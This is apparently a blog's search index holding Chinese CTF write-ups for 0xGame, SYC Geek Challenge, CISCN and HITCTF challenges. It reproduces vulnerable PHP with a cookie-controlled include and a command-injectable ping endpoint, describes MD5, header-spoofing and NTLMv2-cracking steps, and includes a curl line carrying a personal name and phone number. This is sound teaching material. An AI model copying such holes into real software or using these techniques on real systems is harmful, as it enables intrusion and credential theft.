<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20230xGameWeek1-Writeup</title>
    <url>/2023/10/24/20230xGameWeek1-Writeup/</url>
    <content><![CDATA[<h1>20230xGameWeek1-Writeup</h1>
<h2 id="Web">Web</h2>
<h3 id="Sign-In">Sign In</h3>
<p>f12查看源代码，在main.js中找到flag</p>
<p><img src="https://s2.loli.net/2023/10/19/8XbFGiRmQf6jdlk.png" alt=""></p>
<h3 id="baby-php">baby_php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单来分析解读一下，首先时读取了两个get参数a和b，一个post参数c，以及一个cookie。</p>
<p>对于两个get参数a和b的要求时值不相等，但是md5相等，因此我们可以去了解一下MD5绕过，通过0e绕过即可过第一层。然后需要绕过is_numeric和intval， 这两个都是php弱类型的相关函数绕过，之后会开文章进行总结。</p>
<p>在进行以上绕过之后，还需要对最后存在一个可控cookie参数name进行进一步的利用，通过php伪协议进行读取。</p>
<p><img src="https://s2.loli.net/2023/10/21/xp7u6a9TAWHh1zy.png" alt=""></p>
<p>然后将结果进行解码，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<h3 id="hello-http">hello_http</h3>
<p>这题所考察的就是http相关知识</p>
<p>第一步是传入get参数，需要传一个/?query=ctf</p>
<img src="https://s2.loli.net/2023/10/21/LS35EKV8d9FARpv.png"  />
<p>第二步是传入post参数，action=getflag</p>
<p><img src="https://s2.loli.net/2023/10/21/LPm4GfCjn3X5KyQ.png" alt=""></p>
<p>第三步是改变身份认证，在cookie参数中写入role=admin</p>
<p><img src="https://s2.loli.net/2023/10/21/bhacRA5L9zNdr6H.png" alt=""></p>
<p>第四步是本地ip，相关参数有X-Forwarded-For，伪造127.0.0.1</p>
<p><img src="https://s2.loli.net/2023/10/21/w9nH8JUbxcCi4TZ.png" alt=""></p>
<p>第五步是User-Agent，中名为用户代理，可以进行伪造HarmonyOS Browser</p>
<p><img src="https://s2.loli.net/2023/10/21/gCNPT9rqOtJVB4o.png" alt=""></p>
<p>第六步是Referer 请求头包含了当前请求页面的来源页面的地址，<a href="http://xn--ys-jk3c39f.mihoyo.com">传入ys.mihoyo.com</a></p>
<p><img src="https://s2.loli.net/2023/10/21/RkzZV2cBXCnmjfx.png" alt=""></p>
<p>最终得到flag</p>
<p><img src="https://s2.loli.net/2023/10/21/eL257NWDcK8gAuI.png" alt=""></p>
<h3 id="repo-leak">repo_leak</h3>
<p>顾名思义，这是信息泄露相关。这里所考察的是git泄露</p>
<p>题目提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using Git for version control</span><br></pre></td></tr></table></figure>
<p>然后使用githack获取git源，使用命令查看并回退版本</p>
<p><img src="https://s2.loli.net/2023/10/23/WhFzge2GH9yrKcX.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/10/23/YaoVBvlz9761esZ.png" alt=""></p>
<p>最后在本地起一个http服务</p>
<p><img src="https://s2.loli.net/2023/10/23/gyjd9ZoVWkXhJ3v.png" alt=""></p>
<p>得到flag</p>
<p><img src="https://s2.loli.net/2023/10/23/AYNoBeOdJs4rDcF.png" alt=""></p>
<h3 id="ping">ping</h3>
<p>首先f12在源码中找到提示</p>
<p><img src="https://s2.loli.net/2023/10/23/oj6R4OdAN83pgCV.png" alt=""></p>
<p>打开api.php得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function sanitize($s) &#123;</span><br><span class="line">    $s = str_replace(&#x27;;&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27; &#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;/&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    $s = str_replace(&#x27;flag&#x27;, &#x27;&#x27;, $s);</span><br><span class="line">    return $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#x27;ip&#x27;])) &#123;</span><br><span class="line">    die(&#x27;No IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = $_POST[&#x27;ip&#x27;];</span><br><span class="line"></span><br><span class="line">$ip = sanitize($ip);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;, $ip)) &#123;</span><br><span class="line">    die(&#x27;Invalid IP Address&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(&#x27;ping -c 4 &#x27;.$ip. &#x27; 2&gt;&amp;1&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里使用function封装了一个单元，将使用sanitize函数replace了一些字符</p>
<p>同时使用了preg_match 会匹配⼀个 IP 的正则表达式，需要绕过</p>
<p>前端做的部分限制，可以通过bp抓包绕过</p>
<p><img src="https://s2.loli.net/2023/10/23/4xbqaRCzc8r9vWA.png" alt=""></p>
<h3 id="相关知识点总结">相关知识点总结</h3>
<ol>
<li>F12查看源代码</li>
<li>md5绕过</li>
<li>is_numeric函数，intval() 函数绕过</li>
<li>php伪协议</li>
<li>http参数相关</li>
<li>git泄露</li>
</ol>
<h2 id="Misc">Misc</h2>
<h3 id="SignIn">SignIn</h3>
<p>两次编码转换</p>
<p><img src="https://s2.loli.net/2023/10/24/Pzn3UJwAL1iBgYl.png" alt=""></p>
<h3 id="重生之我在教学楼打cs">重生之我在教学楼打cs</h3>
<p>这题没意思，看看就行</p>
<h3 id="shark-shark">shark shark</h3>
<p>打开是一个流量包，仔细观察可以找到一个长度很大的tcp流</p>
<p><img src="https://s2.loli.net/2023/10/24/ndDvtlF7IgkQNsr.png" alt=""></p>
<p>追踪可以看到504B开头，明显是一个压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">504b0304140009000800017e3b573440eb40380000002c00000008000000666c61672e74787474f54e6e559873f67e32d14b6572f12401b92b622d75b576fd8e73fcb0f080c8d232420e19a36ac5d6852ca66d16ba25b8727e2e42d21889504b07083440eb40380000002c000000504b01021f00140009000800017e3b573440eb40380000002c000000080024000000000000002000000000000000666c61672e7478740a00200000000000010018000d740af216f1d90156fc2fa417f1d90195872fa417f1d901504b050600000000010001005a0000006e0000000000</span><br></pre></td></tr></table></figure>
<p>十六进制导入010，得到压缩包，发现需要密码</p>
<p><img src="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png" alt="https://s2.loli.net/2023/10/24/Rj81PYvGXHImFfc.png"></p>
<p>追踪其他tcp流得到密码</p>
<img src="https://s2.loli.net/2023/10/24/ioUgQ7XmBPlZIS8.png" style="zoom:67%;" />
<p>打开压缩包得到flag</p>
<img src="https://s2.loli.net/2023/10/24/w8zIivrHjVlmLN5.png" style="zoom:67%;" />
<h3 id="hide-and-seek">hide and seek</h3>
<p>使用stegseek弱口令爆破得到</p>
<p><img src="https://s2.loli.net/2023/10/26/M2oHPUlO9wqg4BZ.png" alt=""></p>
<h3 id="least-and-most">least and most</h3>
<p>分别使用了lsb（最低有效位）和msb（最高有效位）</p>
<h2 id="Reverse">Reverse</h2>
<h3 id="数字筑基">数字筑基</h3>
<p>这题考察的就是二进制转换为十六进制</p>
<p><img src="https://s2.loli.net/2023/10/23/bHcE4uajoyhAfGp.png" alt=""></p>
<h3 id="代码金丹">代码金丹</h3>
<p>用ida打开后，f5反编译得到flag</p>
<p><img src="https://s2.loli.net/2023/10/24/lNXt5HA74hDCI21.png" alt=""></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>0xGame</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 SYCGeekchallenge-Writeup-Misc</title>
    <url>/2023/12/02/2023%20SYCGeekchallenge-Writeup-Misc/</url>
    <content><![CDATA[<h1>2023 SYCGeekchallenge-Writeup-Misc</h1>
<h2 id="Misc">Misc</h2>
<p>除区块链以外，还差一题ak，太菜啦，qwq~~</p>
<h3 id="cheekin">cheekin</h3>
<p>公众号发送flag，得到一张图片</p>
<p>检查为LSB隐写</p>
<p><img src="https://s2.loli.net/2023/12/02/2zahuAKp7Bx4iTI.png" alt="2023SYCgeek_1"></p>
<h3 id="ez-smilemo">ez_smilemo</h3>
<p>发现存在data.win文件，搜索后发现反编译工具UndertaleModTool</p>
<p>检索后发现存在一段base字符串</p>
<p><img src="https://s2.loli.net/2023/12/02/ZegbPd1kE59r3h4.png" alt="2023SYCgeek_2"></p>
<p>解密后得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/fECjwTMqQnR6BWu.png" alt="2023SYCgeek_3"></p>
<h3 id="下一站是哪儿呢">下一站是哪儿呢</h3>
<p>猪猪侠图片分离出一张图片，银河文字密码解密出得到IWANGTOGOYTOLIQUORCITY</p>
<p><img src="https://s2.loli.net/2023/12/02/a4Jy6OXvd2EhnmI.jpg" alt="2023SYCgeek_4"></p>
<p>然后搜索酒城得到泸州</p>
<p>查询8月25日航班得到答案</p>
<p><img src="https://s2.loli.net/2023/12/02/pnAdREa6PMzX7sC.png" alt="2023SYCgeek_5"></p>
<h3 id="Qingwan心都要碎了">Qingwan心都要碎了</h3>
<p>做题流程  下载附件，是个网页；点进去，可以看到Yxx发的朋友圈；保存下来，用百度识图；发现是重庆中国三峡博物馆</p>
<h3 id="xqr">xqr</h3>
<p>首先使用foremost分离得到了两张二维码</p>
<p>由于其中有一张是模糊的，刚开始愣生生把那张修复好，但是完全扫不出东西</p>
<p>后来有了hint，才恍然大悟</p>
<p>一张尺寸为15×15，一张为75×75</p>
<p>首先 将两张恢复到同一尺寸，然后使用stegsolve的image combiner功能进行XOR</p>
<p><img src="https://s2.loli.net/2023/12/02/oQXf1PbvkL7g2YE.png" alt="2023SYCgeek_6"></p>
<p>得到的二维码用微信扫码就得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/bGOlcXa8ekYJ4FE.png" alt="2023SYCgeek_7"></p>
<h3 id="Tears-of-the-times">Tears of the times</h3>
<p>发现可疑地址</p>
<p><img src="https://s2.loli.net/2023/12/02/gb6V9ZC1MYpeq7R.png" alt="2023SYCgeek_8"></p>
<p>找到相应图片买得到flag</p>
<p><img src="https://s2.loli.net/2023/12/02/hLcjIl7mYRrz4Vx.png" alt="2023SYCgeek_9"></p>
<h3 id="extractMe">extractMe</h3>
<p>crc32碰撞4字节的，结果看图</p>
<p><img src="https://s2.loli.net/2023/12/02/mxFMAk7o5NqtrQ6.png" alt="2023SYCgeek_10.PNG"></p>
<h3 id="DEATH-N0TE">DEATH_N0TE</h3>
<p>给了一张图片，010打开发现末尾有一段base，解密后无用</p>
<p>lsb查看发现存在一段base，解密后得到前半段flag</p>
<p>同时stegsolve查看发现像素点异常，故尝试提取</p>
<p>最终在每隔5个像素点得到需要的图片</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># 存放于同名文件夹之下</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;start.png&#x27;</span>)</span><br><span class="line">pix = im.load()</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 根据实际所需填写像素间隔</span></span><br><span class="line">a = <span class="number">5</span></span><br><span class="line">new_width = width // a</span><br><span class="line">new_height = height // a</span><br><span class="line"><span class="comment"># 创建一个新的图像对象</span></span><br><span class="line">new_img = Image.new(<span class="string">&quot;RGB&quot;</span>, (new_width, new_height))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, width, a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, height, a):</span><br><span class="line">        rgb = pix[x, y]</span><br><span class="line">        new_img.putpixel((x // a, y // a), (<span class="built_in">int</span>(rgb[<span class="number">0</span>]), <span class="built_in">int</span>(rgb[<span class="number">1</span>]), <span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">new_img.save(<span class="string">&#x27;new_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/nDFfAt9IH7wJ5pq.png" alt="2023SYCgeek_11.PNG"></p>
<p>对照得到字符串</p>
<p>TkFNRV9vMnRha3VYWH0=</p>
<p>得到一半flag</p>
<p>还有一段藏在lsb隐写给的一长段base64中</p>
<p><img src="https://s2.loli.net/2023/12/02/yjqiaQmLWRSrAfb.png" alt="2023SYCgeek_12.PNG"></p>
<h3 id="DEATH-N1TE">DEATH_N1TE</h3>
<p>将图片分帧，gaps拼图，得到一半flag</p>
<p><img src="https://s2.loli.net/2023/12/02/ZehOUiNatAV1oM4.png" alt="2023SYCgeek_13"></p>
<p>使用rx-sstv播放mp3文件获取第一部分flag</p>
<p><img src="https://s2.loli.net/2023/12/02/vTPGmZuJ7QMbX2q.png" alt="2023SYCgeek_14"></p>
<p>SYC{H4xr0t0r_14_Ki114R}</p>
<h3 id="DEATH-N2TE">DEATH_N2TE</h3>
<p>先视频分帧</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cap = cv2.VideoCapture(<span class="string">&#x27;kira.mp4&#x27;</span>)</span><br><span class="line">output_folder = <span class="string">&#x27;frames&#x27;</span></span><br><span class="line">os.makedirs(output_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line">frame_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    frame_count += <span class="number">1</span></span><br><span class="line">    frame_filename = <span class="string">f&quot;<span class="subst">&#123;output_folder&#125;</span>/frame_<span class="subst">&#123;frame_count:04d&#125;</span>.jpg&quot;</span></span><br><span class="line">    cv2.imwrite(frame_filename, frame)</span><br><span class="line">    cv2.imshow(<span class="string">&#x27;Processed Frame&#x27;</span>, frame)</span><br><span class="line">    <span class="keyword">if</span> cv2.waitKey(<span class="number">25</span>) &amp; <span class="number">0xFF</span> == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>提取所有白色的像素点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">input_folder = <span class="string">&#x27;./frames&#x27;</span></span><br><span class="line">output_image = <span class="string">&#x27;output_combined_image.jpg&#x27;</span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(input_folder) <span class="keyword">if</span> f.endswith((<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>))]</span><br><span class="line">max_x, max_y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> image_file <span class="keyword">in</span> image_files:</span><br><span class="line">    image_path = os.path.join(input_folder, image_file)</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    max_x = <span class="built_in">max</span>(max_x, image.shape[<span class="number">0</span>])</span><br><span class="line">    max_y = <span class="built_in">max</span>(max_y, image.shape[<span class="number">1</span>])</span><br><span class="line">combined_image = np.zeros((max_x, max_y, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line"><span class="keyword">for</span> image_file <span class="keyword">in</span> image_files:</span><br><span class="line">    image_path = os.path.join(input_folder, image_file)</span><br><span class="line">    image = cv2.imread(image_path)</span><br><span class="line">    gray_image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    _, binary_image = cv2.threshold(gray_image, <span class="number">200</span>, <span class="number">255</span>, cv2.THRESH_BINARY)</span><br><span class="line">    white_pixel_coordinates = np.column_stack(np.where(binary_image == <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">for</span> coordinate <span class="keyword">in</span> white_pixel_coordinates:</span><br><span class="line">        x, y = coordinate</span><br><span class="line">        combined_image[x, y, :] = [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>]  <span class="comment"># 设置为白色</span></span><br><span class="line">cv2.imwrite(output_image, combined_image)</span><br><span class="line">cv2.imshow(<span class="string">&#x27;Combined Image&#x27;</span>, combined_image)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>得到flag：SYC{we1c0m4_T0_De@tH_W0r1d}</p>
<p>最后压缩一下像素点，是图片更清楚</p>
<p><img src="https://s2.loli.net/2023/12/02/KzQufGPXsp7LZWx.png" alt="2023SYCgeek_15"></p>
<h3 id="窃听风云">窃听风云</h3>
<p>就是对捕捉的Ntlm协议进行解析</p>
<p>详细解析如下</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash">渗透技巧——利用netsh抓取连接文件服务器的NTLMv2 Hash (3gstudent.github.io)</a></p>
<p>基本格式</p>
<p>NTLMv2的格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>
<p>然后使用john和rockyou.txt破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NETNTLMv2: jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000 </span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/yKxAprDETQG3HiV.png" alt="2023SYCgeek_16"></p>
<p><img src="https://s2.loli.net/2023/12/02/HM8U4bSsF6fjE1k.png" alt="2023SYCgeek_17"></p>
<h3 id="窃听风云-v2">窃听风云-v2</h3>
<p>这是仅有的没有做出来的一道题，qwq，其实不难的</p>
<p>基本原理同上，但是由于是使用的smtp协议，所以不能自动解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jack::WidgetLLC.Internal:3e3966c8cacd29f7:ddd46fd8f78c262eae16918f66185497:010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/02/1sX2j3rEeZNofSw.png" alt="2023SYCgeek_18"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>SYCGeekchallenge</tag>
      </tags>
  </entry>
  <entry>
    <title>2023Ciscn-Writeup</title>
    <url>/2023/09/28/2023Ciscn-Writeup/</url>
    <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
<h2 id="Misc">Misc</h2>
<h3 id="签到卡">签到卡</h3>
<p>前往公众号查看提示</p>
<img src="https://s2.loli.net/2023/09/29/oJZMzENhLVPRB3H.jpg" style="zoom: 50%;" />
<p>print(open(‘/flag’).read())</p>
<img src="https://s2.loli.net/2023/09/29/vP81gtA4meOCbzx.jpg" style="zoom: 65%;" />
<h3 id="被加密的生产流量">被加密的生产流量</h3>
<p>下载附件得到一个modbus.pcap，用wireshark打开后，查看Modbus/TCP协议，按正常顺序排序。</p>
<p><img src="https://s2.loli.net/2023/09/29/xVKGsjTdmtwIy43.jpg" alt=""></p>
<p>在正常的数据流之后，在末尾段发现异常字母，逐一提取拼接，得到一个字符串</p>
<p><img src="https://s2.loli.net/2023/09/29/n3l2yedwSfrbTUM.jpg" alt=""></p>
<p>将字符串进行base32编码，得到flag</p>
<p><img src="https://s2.loli.net/2023/09/29/KeXyMoC7NsWmgpl.jpg" alt=""></p>
<h3 id="国粹">国粹</h3>
<p>下载附件给出了三个图</p>
<p>观察题目那图发现多出一个一万，拼接考虑成x轴和y轴，猜测与坐标有关</p>
<p>一万到九万是1-9，一筒到九筒是10-18，一条到九条是19-27，东南西北中发白是28-34，春夏秋冬梅兰竹菊是35-42</p>
<p>所以将a中的作为横坐标，k作为纵坐标进行绘图</p>
<p>得到最终的flag为flag{202305012359}</p>
<h2 id="crypto">crypto</h2>
<h3 id="国密">国密</h3>
<p>下载附件，查看提示，根据其密钥分发流程进行操作</p>
<p><img src="https://s2.loli.net/2023/09/29/HTBcAo3kXvmD2Z5.jpg" alt=""></p>
<p>首先发送</p>
<p><code>curl -d &quot;name=%E7%8E%8B%E5%98%89%E5%AE%87&amp;school=%E5%93%88%E5%B0%94%E6%BB%A8%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6&amp;phone=17625419356&quot; http://39.106.48.123:24920/api/login</code></p>
<p>得到用户id</p>
<p><code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code></p>
<p>生成SM2算法的公钥和密钥</p>
<p><code>A_Public_Key:C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B</code><br>
<code>A_Private_Key:CB42D512CD6C0E170CDE1F7611946C797ED546BD017BF784CF954E1D4F4D2CAB</code></p>
<p>发送公钥</p>
<p>curl -d “id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;publicKey=C25D0FF8A640422159ABC18A2DE046F33E348A788356E09514C0FD47023D04621D43926D0E76B7325AA3FC5B1C9C1F44A46AED2E91198FFA0FE83990F326EB0B” <a href="http://39.106.48.123:24920/api/allkey">http://39.106.48.123:24920/api/allkey</a></p>
<p>得到结果</p>
<p><code>&#123;</code><br>
<code>&quot;message&quot;: &quot;success&quot;,</code><br>
<code>&quot;data&quot;: &#123;</code><br>
<code>&quot;publicKey&quot;: &quot;0463e8cc27aa0be1438ad237b6f9bcf2180baf4ed91cb1706ad6beed7d4c91cedc387b93f47ddae75e949b3a0fcc17332614dbbc72ff3f4426bf4f0744b6af6d3b&quot;,</code><br>
<code>&quot;privateKey&quot;: &quot;0b31854a2fdb1c7da50dc8850223b35099d92bd001fa8d9aa70e0a91292a7e00&quot;,</code><br>
<code>&quot;randomString&quot;: &quot;036942bd54cf3183089cd6c2ea2962d8cccf37b3ac8c92a9a4663281f28ee49edd3162a0dabefba2c697c48cdd76a79ae8b6556a3957e3ad0ac89dea2f2937e2e9b446a0a907a03365ca8237e53395e914893ea55d12804396dd75f0e2cba03083d2cb7e0d50dabc9a37497c8faaa2d1&quot;,</code><br>
<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;</code><br>
<code>&#125;</code><br>
<code>&#125;</code></p>
<p>将随机数C密文采用SM2算法解密，得到结果</p>
<p><code>56 BE 6C 83 45 46 BE 80 76 44 C4 B5 AD C7 29 CD</code></p>
<p>使用16字节随机数C明文，对私钥B_Private_Key密文，采用SM4ECB算法解密</p>
<p><code>99 BE 58 13 90 48 3E 81  3C DE 0B B2 BD 27 6C 2A   98 26 16 B0 15 5D E0 6E  21 BF 41 47 73 A4 AB AE</code></p>
<p>向服务器请求密钥，得到回应</p>
<p><code>&#123;</code><br>
<code>&quot;message&quot;: &quot;success&quot;,</code><br>
<code>&quot;data&quot;: &#123;</code><br>
<code>&quot;id&quot;: &quot;7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot;,</code><br>
<code>&quot;quantumString&quot;: &quot;a0c80a6b59232277fac84d8c2a7353435bc67bfe379ea1412146779d383a4f759d754bb8f06b6e3ae84d125b221feeb3f8c74737de7bdb821bb4725f7ae62efe5af67bbd60634e73936b34b657735e46c0c92ed91330b5d817870e48585050116cdef1f37c6d03bd2cb45d7df21e009c&quot;</code><br>
<code>&#125;</code><br>
<code>&#125;</code></p>
<p>使用私钥B_Private_Key明文，对密钥D密文进行解密</p>
<p><code>09 87 9B 5F 8D 9A 7F 83 32 7D 54 E3 59 84 38 C7</code></p>
<p>发送验证，得到flag</p>
<p><code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&amp;quantumString=09879B5F8D9A7F83327D54E3598438C7&quot; http://39.106.48.123:24920/api/check</code><br>
<code>curl -d &quot;id=7a86f8de-7824-48a7-957d-2896a8fcf7ce&quot; http://39.106.48.123:24920/api/search</code></p>
<h3 id="Sign-in-passwd">Sign_in_passwd</h3>
<p>观察字符串，发现是符合base64的码表，但结尾不为=，大概是换表了</p>
<p><img src="https://s2.loli.net/2023/09/29/MspnjIl3tJThkS2.jpg" alt=""></p>
<p>将下面的那串字符串进行url解码，以此为码表，对上面的字符串进行解码</p>
<p><img src="https://s2.loli.net/2023/09/29/65xfZkeKvhV93YL.jpg" alt=""></p>
<p>最终解码出来的结果不知道为什么少了一个}，手动补上</p>
<p><img src="https://s2.loli.net/2023/09/29/At3rckvpngz1aul.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2023HITCTF-Misc-Writeup</title>
    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
<h2 id="前言">前言</h2>
<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
<h2 id="leftover-file">leftover file</h2>
<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
<p>发现response存在异常</p>
<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
